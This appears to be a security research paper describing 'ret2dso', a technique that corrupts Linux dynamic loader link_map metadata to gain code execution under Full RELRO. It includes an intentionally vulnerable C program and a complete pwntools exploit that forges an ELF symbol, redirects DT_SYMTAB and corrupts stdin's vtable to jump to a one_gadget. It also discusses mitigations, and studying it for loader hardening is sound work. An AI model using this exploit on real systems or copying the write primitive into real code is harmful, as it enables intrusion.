![Intro picture](https://lowlevel.re/uploads/1769474495548.png)

## Abstract

`ret2dlresolve` is commonly assumed to be obsolete on modern Linux systems due to **Full RELRO**, **eager binding**, and the elimination of writable GOT entries. This paper demonstrates that this assumption is **fundamentally incomplete**.

We introduce **ret2dso**, a runtime exploitation technique that achieves **arbitrary code execution under Full RELRO**, **without PLT**, **without GOT**, and **without absolute address disclosure**, by corrupting **dynamic loader metadata of already-loaded DSOs**.

Rather than explicitly forcing the dynamic linker to resolve attacker-controlled symbols, ret2dso abuses **legitimate runtime resolution paths** and the loader’s implicit trust in its own mutable metadata, resulting in **direct and deterministic control of RIP**.

This paper explicitly separates **invariant**, **mechanism**, and **demonstration**, and presents a fully detailed end-to-end proof-of-concept intended as a **research-grade reference** for modern post-mitigation exploitation.

---

## 1. Threat Model

We assume the attacker has:

* An **arbitrary memory write primitive**
    * possibly byte-granular
    * possibly relative
* **No memory read primitive**
* **No absolute address disclosure**
* ASLR, PIE, NX, **Full RELRO**, IBT, SHSTK enabled

The origin of the primitive (heap overflow, stack corruption, type confusion, logic bug, etc.) is out of scope.

This threat model reflects modern post-mitigation exploitation scenarios where information disclosure is unavailable but partial corruption remains possible.

---

## 2. ret2dlresolve — The Underlying Invariant

Classic `ret2dlresolve` relies on forging relocation records and invoking the PLT to coerce the dynamic loader into resolving attacker-controlled symbols.

The PLT itself is not fundamental.

> **Invariant — Loader Resolution Invariant**
> If the dynamic loader resolves a symbol using attacker-controlled metadata, arbitrary code execution follows.

ret2dso preserves this invariant while eliminating all dependencies on:

* PLT stubs
* GOT entries
* lazy binding
* writable relocation records

---

## 3. Loader Internals

Each loaded object is represented by a persistent `struct link_map`:

```c
struct link_map {
    Elf64_Addr l_addr;
    char *l_name;
    Elf64_Dyn *l_ld;
    struct link_map *l_next, *l_prev;
    Elf64_Dyn *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM];
};
```

Key observations:

* `link_map` structures persist for the lifetime of the process
* Several fields remain writable even under Full RELRO
* Runtime subsystems consult loader metadata long after startup

This behavior is not a vulnerability in isolation, but a consequence of the loader’s trust model.

---

## 4. Resolution Semantics

During symbol resolution, the dynamic loader computes:

```
resolved_address = sym->st_value + l_addr
```

No bounds checking or semantic validation is applied to `st_value`. Control over this field is sufficient to redirect execution.

The loader implicitly trusts all metadata reachable via `link_map`. When the resolved symbol is later dereferenced as a function pointer, control flow is transferred directly to `sym->st_value + l_addr`, resulting in direct control of RIP.

---

## 5. Runtime Resolution Surface

Despite eager binding:

* DSO enumeration remains active
* Runtime symbol lookup paths persist
* libc subsystems (notably stdio) consult loader state

### Entry into `_dl_find_dso_for_object`

![dso\_find\_for\_object](https://lowlevel.re/uploads/1769473291923.png)

### Resolution flowing into `execvpe`

![dso\_for\_object\_execvpe](https://lowlevel.re/uploads/1769473294957.png)

---

## 6. Relativity Under ASLR

> **Note on ASLR and relative mappings**
> Linux ASLR does not guarantee fixed relative offsets between DSOs. However, the dynamic loader enforces a constrained and ordered mapping of core objects (`ld.so`, `libc`, stdio globals). ret2dso does not rely on an exact offset, but on the existence of a loader-relative writable region reachable from a stable anchor object (e.g. `_IO_2_1_stdin_`) using a weak write primitive.

ASLR randomizes absolute addresses, but in practice the loader enforces a constrained and ordered layout:

* `stdin` ↔ libc
* libc ↔ ld.so
* loader writable segments ↔ loader metadata

ret2dso relies solely on **relative positioning**, not absolute disclosure.

Importantly, ret2dso requires reachability rather than predictability: no fixed offset, brute force, or probabilistic assumption is required.

---

## 7. ELF Symbol Forgery

An ELF symbol is defined as:

```c
typedef struct {
    Elf64_Word  st_name;
    unsigned char st_info;
    unsigned char st_other;
    Elf64_Half  st_shndx;
    Elf64_Addr  st_value;
    Elf64_Xword st_size;
} Elf64_Sym;
```

In the exercised resolution path, only `st_value` contributes to the final control-flow transfer. Other fields are either ignored or used exclusively for bookkeeping and consistency checks.

As a result, a forged symbol entry may reuse all fields from a legitimate symbol, modifying only `st_value` to redirect execution.

---

## 8. Proof of Concept — Vulnerable Program

The vulnerable program intentionally exposes a **relative, byte-wise arbitrary write** primitive anchored at `stdin`. The full source is reproduced below to ensure the proof-of-concept is **self-contained and reproducible**.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <link.h>
#include <string.h>

extern struct r_debug _r_debug;

static void get_distance(void) {
    struct link_map *lm = _r_debug.r_map;
    uintptr_t stdin_addr = (uintptr_t)stdin;

    while (lm) {
        if (lm->l_name && strstr(lm->l_name, "ld-linux")) {
            uintptr_t ld_base = (uintptr_t)lm->l_addr;
            intptr_t drift = (intptr_t)ld_base - (intptr_t)stdin_addr;
            printf("ld distance: %lx\n", (uint64_t)drift);
            break;
        }
        lm = lm->l_next;
    }
}

static void drift_write(void) {
    long delta;
    unsigned int byte;

    puts("format: <delta> <byte>");

    for (int i = 0; i < 30; i++) {
        if (scanf("%ld %x", &delta, &byte) != 2)
            break;

        ((unsigned char*)stdin)[delta] = (unsigned char)byte;
    }
}

int main(void) {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);

    get_distance();
    drift_write();

    _exit(0);
}
```

---

## 9. Proof of Concept — Exploit

```python
from pwn import *

context.binary = ELF("dist/ret2dso")
context.log_level = "info"

STDIN_VTABLE_OFFSET       = 0xd8
LDBASE_WRITABLE_OFFSET    = 0x3a000
LINFO_SYMTAB_OFFSET       = 0xb60
DSO_SYM_ENTRY_OFFSET      = 0x208
ONE_GADGET_OFFSET         = 0x12ee1a

def drift_write(io, target, data):
    for i, b in enumerate(data):
        io.sendline(f"{target + i} {b:02x}".encode())

p = remote("localhost", 1447)

p.recvuntil(b"distance: ")
entropy = int(p.recvline().strip(), 16)

st_value = -(entropy + ONE_GADGET_OFFSET) & 0xffffffffffffffff

fake_sym = (
    p64(0x19) +
    p64(0xd001200000020) +
    p64(st_value)
)

# Redirect DT_SYMTAB
target = entropy + LDBASE_WRITABLE_OFFSET + LINFO_SYMTAB_OFFSET
drift_write(p, target, b"\xf0")

# Overwrite symbol entry
target = entropy + LDBASE_WRITABLE_OFFSET + DSO_SYM_ENTRY_OFFSET
drift_write(p, target, fake_sym)

# Trigger resolution
target = STDIN_VTABLE_OFFSET + 7
drift_write(p, target, b"\xff")

p.interactive()
```

---

## 9.1 Exploit Walkthrough — Conceptual Breakdown

This section decomposes the exploit into **logical phases**, independent of concrete offsets or gadgets. The objective is to clarify *why* each corruption is required, not merely *how* it is implemented.

The exploit relies exclusively on **relative, byte-granular writes** and the dynamic loader’s implicit trust in its own metadata.

### Phase 1 — Establishing a Stable Anchor

The exploit assumes no absolute address disclosure. Instead, it leverages a **globally reachable object** as a positional anchor.

In this proof-of-concept, `stdin` is used because:

* it is globally accessible from user code
* it resides in libc, which is consistently mapped relative to the dynamic loader
* it participates in runtime paths that consult loader metadata

Only the **relative distance** between `stdin` and the loader is required. This reflects real-world scenarios where relative layout may be inferred or partially controlled without leaking absolute addresses.

At this stage, the attacker has:

* no absolute addresses
* a stable reference point
* a relative write primitive anchored at that reference

No corruption has yet occurred.

While `stdin` is used here for concreteness, ret2dso does not rely on any property specific to stdio. Any globally reachable object participating in a runtime path that consults loader metadata is sufficient.

---

### Phase 2 — Re-targeting Loader Metadata

Under Full RELRO, relocation tables and GOT entries are read-only. However, portions of the loader’s **runtime metadata remain writable**.

Notably:

* `struct link_map` instances persist for the lifetime of the process
* `l_info` entries reference critical dynamic information
* pointers such as `DT_SYMTAB` are trusted without revalidation

The exploit corrupts a loader-relative pointer so that a subsequent symbol lookup consults **attacker-influenced memory** instead of the original symbol table.

This step does not fabricate a new structure. It merely **repoints an existing trusted pointer** to a writable region.

At the end of this phase:

* loader metadata remains structurally valid
* no control flow has yet been redirected
* the loader is primed to consume forged symbol data

---

### Phase 3 — Forging a Minimal ELF Symbol

Rather than constructing a full fake ELF environment, the exploit forges **only the minimal semantic unit required for control-flow transfer**.

During resolution, the loader computes:

`resolved = sym->st_value + l_addr`

No other field of `Elf64_Sym` contributes to the final jump target.

Accordingly, the exploit:

* copies an existing legitimate symbol entry
* modifies only `st_value`
* preserves all other fields for structural consistency

The forged `st_value` is chosen such that:

`st_value + l_addr == desired_gadget`

This computation relies exclusively on **relative positioning**, not absolute disclosure.

At this point:

* no illegal memory access has occurred
* no bounds or semantic checks have been violated
* the forged symbol is indistinguishable from a legitimate one during resolution

---

### Phase 4 — Triggering Legitimate Resolution

The final phase introduces no new corruption. Instead, it forces execution through a **legitimate libc runtime path** that performs symbol resolution.

A single-byte corruption inside the `stdin` FILE structure redirects execution into a path that:

* queries loader metadata
* performs symbol lookup
* dereferences the resolved symbol as a function pointer

Because the loader has already been primed with forged metadata, this resolution results in **direct control of RIP**.

No ROP chain, PLT stub, or writable GOT entry is required.

---

### Exploit Properties Summary

Across all phases, the exploit maintains the following properties:

* no absolute addresses
* no memory disclosure
* no illegal memory permissions
* no violation of loader invariants

Each step operates entirely within **legitimate runtime behavior**, abusing trust rather than breaking rules.

---

## 10. Exploit Result

![exploit\_finished](https://lowlevel.re/uploads/1769473297928.png)

---

## 11. Security Implications

* Full RELRO does not protect loader metadata
* Loader runtime state remains mutable and implicitly trusted
* Weak write primitives suffice for full control-flow hijack

---

## 12. Mitigation Discussion

Potential mitigations include:

* Making loader metadata read-only post-relocation
* Hardening runtime resolution paths
* Validating symbol contents before use

All approaches carry significant compatibility or performance costs.

ret2dso illustrates that the dynamic loader remains part of the trusted computing base even after traditional relocation hardening, and that breaking this assumption is non-trivial without redesigning runtime linking itself.

---

## 13. Conclusion

ret2dso generalizes the invariant behind ret2dlresolve and demonstrates that dynamic loader metadata remains a viable attack surface under modern hardening.

Removing PLT and writable GOT entries does not eliminate the fundamental trust assumptions of runtime symbol resolution.

Source code & environment setup: https://github.com/retleave/pocs

---

*This document is intended for defensive research and educational purposes.*